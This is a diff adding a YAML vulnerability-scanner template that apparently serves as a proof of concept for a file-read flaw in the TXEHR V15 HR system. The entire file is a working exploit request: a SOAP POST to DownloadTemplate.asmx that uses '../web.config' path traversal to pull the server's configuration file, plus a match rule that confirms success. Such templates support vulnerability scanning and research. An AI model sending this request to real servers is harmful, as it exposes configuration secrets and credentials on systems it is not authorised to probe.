@@ -1,0 +1,30 @@
+name: poc-yaml-tongxiangHR-TXEHR_V15_DownloadTemplate-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Service/DownloadTemplate.asmx
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/DownloadFile"
+      body: '<?xml version="1.0" encoding="utf-8"?>
+         <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+           <soap:Body>
+             <DownloadFile xmlns="http://tempuri.org/">
+               <path>../web.config</path>
+             </DownloadFile>
+           </soap:Body>
+        </soap:Envelope>
+        '
+    expression: response.status == 200 && response.body.bcontains(b'PD94bWwg') && response.body.bcontains(b'<?xml version="1.0"')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485039&idx=1&sn=77e04705702397154c3acb50aeef8ab2&chksm=c267b35cf5103a4a221d45fa88d539dac31afb530629a583006872c0e0e899d9d25a28d2d2ba&token=1439003696&lang=zh_CN#rd
